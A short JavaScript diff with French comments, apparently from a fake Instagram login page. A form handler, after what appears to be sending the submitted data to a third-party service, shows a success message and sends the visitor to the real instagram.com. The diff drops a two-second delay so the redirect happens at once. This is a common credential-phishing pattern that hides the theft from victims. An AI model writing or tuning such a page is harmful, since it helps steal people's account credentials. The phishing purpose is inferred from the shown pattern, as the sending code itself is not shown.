@@ -12,10 +12,8 @@ document.getElementById('loginForm').addEventListener('submit', function(event) 
         console.log('SUCCESS!', response.status, response.text);
         document.getElementById('loginMessage').textContent = "Connexion réussie!";
         
-        // Redirection vers Instagram après un délai de 2 secondes
-        setTimeout(function() {
-            window.location.href = 'https://www.instagram.com';
-        }, 2000); 
+        // Redirection vers Instagram
+        window.location.href = 'https://www.instagram.com';
     }, function(error) {
         console.log('FAILED...', error);
         document.getElementById('loginMessage').textContent = "Échec de la connexion.";
